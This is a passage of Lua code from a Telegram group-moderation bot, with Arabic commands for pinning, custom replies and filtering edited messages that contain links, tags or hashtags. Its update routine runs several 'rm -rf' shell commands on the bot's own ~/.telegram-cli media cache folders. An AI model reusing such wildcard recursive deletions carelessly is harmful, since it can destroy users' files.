 io.popen("rm -rf ~/.telegram-cli/data/temp/*")
 io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*")
 io.popen("rm -rf ~/.telegram-cli/data/voice/*")
 io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
end


if text ==('pin') and msg.reply_to_message_id_ ~= 0 then  
   print('هاو')
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = msg.chat_id_, 
message_id_ = msg.reply_to_message_id_, 
disable_notification_ = 1 
},function(arg,data) vardump(data) 
end,nil)
end 
if text == 'تحديث' and is_leader(msg) then  dofile('FAEDER.lua')  io.popen("rm -rf ~/.telegram-cli/data/audio/*") io.popen("rm -rf ~/.telegram-cli/data/document/*") io.popen("rm -rf ~/.telegram-cli/data/photo/*") io.popen("rm -rf ~/.telegram-cli/data/sticker/*") io.popen("rm -rf ~/.telegram-cli/data/temp/*") io.popen("rm -rf ~/.telegram-cli/data/thumb/*") io.popen("rm -rf ~/.telegram-cli/data/video/*") io.popen("rm -rf ~/.telegram-cli/data/voice/*") io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") print("\27[31;47m\n          💥»» تم تحديث البوت ««💥          \n\27[0;34;49m\n") 
faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تحديث البوت • ', 1, 'md') end 
--------------faeder
if is_leader(msg) then
          local text = msg.content_.text_:gsub("[Ss]etprice", "Setnerkh")
          if text:match("^[Ss]etnerkh$") or text:match("^ضع كليشه المطور$") then
            if database:get("lang:gp:" .. msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ Plese Send your now •", 1, "md")
            else
              faederdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ ارسل لي كليشه المطور الان •", 1, "md")
            end
            database:setex("bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 100, true)
          end
        end
          
 
        if text and text == 'اضف رد للكل' and is_sudo(msg)  then 
    faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ارسل الكلمه  ', 1, 'md')
   database:set(bot_id.."add:repallt"..msg.sender_user_id_..bot_id,'yes')   
 return false   
 end    
  if text then     
local tt =   database:get(bot_id.."add:repallt"..msg.sender_user_id_..bot_id)
    if tt == 'yes' then     
faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ارسل الرد الان  ', 1, 'md')    
database:set(bot_id.."add:repallt"..msg.sender_user_id_..bot_id,'yes1') 
     database:set(bot_id.."addreply2:"..msg.sender_user_id_..bot_id, text)    
   database:sadd("rep:media:all"..bot_id,text)   
 return false    
end   
 end
 if text and text == 'حذف رد للكل' and  is_sudo(msg) then   
  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ارسل الكلمه  ', 1, 'md')
       database:set(bot_id.."add:repallt"..msg.sender_user_id_..bot_id,'yes11')   
 return false 
   end
        -------------------------------------------------faeder----------------------------------------------
        if text:match("^قرنابيط$") then
          faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ قنوات السورس •\n\n• [@faeder_ch] •\n\n• [@team_faeder] •', 1, 'md')    
        end
      end
      -----------------------------------------faeder------------------------------------------------------
    end
    
    -----------------------------------------faeder------------------------------------------------------
    -- end code --
    -- Number Update 5
    ---------------------------------------faeder--------------------------------------------------------
  elseif (data.ID == "UpdateChat") then
    chat = data.chat_
    chats[chat.id_] = chat
    ---------------------------------------faeder--------------------------------------------------------
  elseif (data.ID == "UpdateMessageEdited") then
    local msg = data
    function get_msg_contact(extra, result, success)
      local text = (result.content_.text_ or result.content_.caption_)
      if result.id_ and result.content_.text_ then
        database:set('bot:editid'..result.id_,result.content_.text_)
      end
      if not is_vipmem(result.sender_user_id_, result.chat_id_) then
        check_filter_words(result, text)
        if database:get('editmsg'..msg.chat_id_) then
          local msgs = {[0] = data.message_id_}
          delete_msg(msg.chat_id_,msgs)
        end
        if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
          if database:get('bot:links:mute'..result.chat_id_) then
            local msgs = {[0] = data.message_id_}
            delete_msg(msg.chat_id_,msgs)
          end
        end
        if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match("/") then
          if database:get('bot:webpage:mute'..result.chat_id_) then
            local msgs = {[0] = data.message_id_}
            delete_msg(msg.chat_id_,msgs)
          end
        end
        if text:match("@") then
          if database:get('tags:lock'..result.chat_id_) then
            local msgs = {[0] = data.message_id_}
            delete_msg(msg.chat_id_,msgs)
          end
        end
        if text:match("#") then
          if database:get('bot:hashtag:mute'..result.chat_id_) then
            local msgs = {[0] = data.message_id_}
            delete_msg(msg.chat_id_,msgs)
          end
        end
        if text:match("[\216-\219][\128-\191]") then
          if database:get('bot:arabic:mute'..result.chat_id_) then
            local msgs = {[0] = data.message_id_}
            delete_msg(msg.chat_id_,msgs)
          end
        end
        if text:match("[A-Z]") or text:match("[a-z]") then
          if database:get('bot:english:mute'..result.chat_id_) then
            local msgs = {[0] = data.message_id_}
            delete_msg(msg.chat_id_,msgs)
          end
        end
      end
    end
    getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
    ---------------------------------------faeder--------------------------------------------------------
  elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
    tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
  end
  -----------------------------------------faeder------------------------------------------------------
  end
  end
  end
  
  --[[
  _____              _                 _
|  ___|_ _  ___  | | ___ _     | |_  
| |_ / _` |/ _ \/ _` |/ _ \ '|  / _` \ \/ /
|  _| (_| |  / (_| |  / |    | (_| |>  <
|_|  \,_|\___|\__,_|\___|_|     \__,_/_/\_\
  -- by faeder dx @pro_c9
 -- join in chennel @faeder_ch and @team_faeder
 
 --]]
-- END VERSION FAEDER DX 
